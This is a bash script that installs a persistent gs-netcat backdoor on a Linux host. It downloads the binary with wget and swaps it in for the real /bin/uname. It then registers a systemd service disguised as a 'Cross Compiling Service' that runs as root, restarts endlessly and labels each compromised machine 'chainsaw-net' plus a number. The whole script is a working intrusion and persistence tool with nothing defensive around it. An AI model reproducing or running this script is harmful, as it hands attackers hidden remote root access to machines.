#!/bin/bash

if [ "$EUID" -ne 0 ]
        then echo "Run as root."
        exit
fi

AMD64="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz"
wget $AMD64 -O /tmp/gs-netcat.tar.gz

printf "Machine's number: "
read num

num=$(printf "%04d\n" $num)
machine="chainsaw-net"$num

tar -xvf /tmp/gs-netcat.tar.gz -C /tmp/
chmod +x /tmp/gs-netcat && mv /tmp/gs-netcat /tmp/uname
rm /bin/uname /tmp/gs-netcat*
mv /tmp/uname /bin/uname

cat << EOF > /etc/systemd/system/gs.service
[Unit]
Description=Cross Compiling Service
After=newtork.target
StartLimitIntervalSec=0
[Service]
Restart=always
RestartSec=1
User=root
ExecStart=/usr/bin/uname -li -s $machine
[Install]
WantedBy=multi-user.target
EOF

systemctl enable gs --now
systemctl status gs
